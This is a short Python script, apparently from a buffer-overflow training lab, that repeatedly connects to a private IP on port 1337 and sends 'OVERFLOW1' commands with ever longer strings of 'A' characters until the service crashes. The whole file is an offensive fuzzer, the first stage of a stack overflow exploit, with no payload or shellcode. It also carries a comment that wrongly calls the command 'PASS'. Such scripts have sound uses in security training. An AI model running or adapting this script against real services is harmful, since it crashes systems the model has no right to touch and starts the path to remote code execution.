# Author: z3r0day

import socket
import sys
import time


print("[+] Initiating the Crash Now!\n")

buff = "A" * 100

while len(buff) < 5000:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Connect to the Application
	s.connect(('10.10.73.133', 1337))
	s.recv(1024)	#Recv the banner


	#Finally the vulnerable command PASS
	s.send('OVERFLOW1 ' + buff + '\r\n')
	s.send('EXIT\r\n')
	s.close()
	print("[+] Currently The Byte Size is %s " % len(buff))
	buff += "A" * 200
	time.sleep(5)
